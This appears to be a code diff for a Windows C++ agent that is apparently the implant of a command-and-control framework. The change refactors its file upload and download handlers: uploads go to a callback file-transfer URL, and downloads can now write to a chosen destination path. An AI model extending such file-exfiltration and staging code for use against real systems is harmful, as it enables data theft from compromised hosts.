@@ -4,6 +4,7 @@
 
 #include "Agent.h"
 #include "base64.hpp"
+#include "FileTransfer.h"
 
 #include <stdio.h>
 #include <winsock2.h>
@@ -662,7 +663,11 @@ IntitalCheckinRequest Agent::GetHostInformation()
 // File Transfer Commands
 Response Agent::UploadFile(const int &taskID, const CommandUploadFile &uploadRequest)
 {
-    const bool sent = commManager.SendFile(uploadRequest.path, taskID);
+    const bool sent = FileTransfer::SendFile(
+        uploadRequest.path,
+        commManager.GetCallbackUUID(),
+        taskID,
+        commManager.GetFileTransferUrl());
     if (sent)
         return CreateTaskResponse(taskID, UPLOAD, NO_CODE, SUCCESS, TaskSuccess{"File uploaded successfully."});
     return CreateTaskResponse(taskID, UPLOAD, NO_CODE, TASK_ERROR, TaskError{1, "File upload failed."});
@@ -675,7 +680,10 @@ Response Agent::DownloadFile(const int &taskID, const CommandDownloadFile &downl
         if (downloadRequest.path.empty())
             throw std::invalid_argument("Download path is empty.");
 
-        const auto requestedPath = std::filesystem::path(downloadRequest.path);
+        const auto requestedPath = std::filesystem::path(
+            downloadRequest.destinationPath.empty()
+                ? downloadRequest.path
+                : downloadRequest.destinationPath);
         const auto path = requestedPath.is_absolute()
                               ? requestedPath
                               : std::filesystem::path("files") / requestedPath.filename();
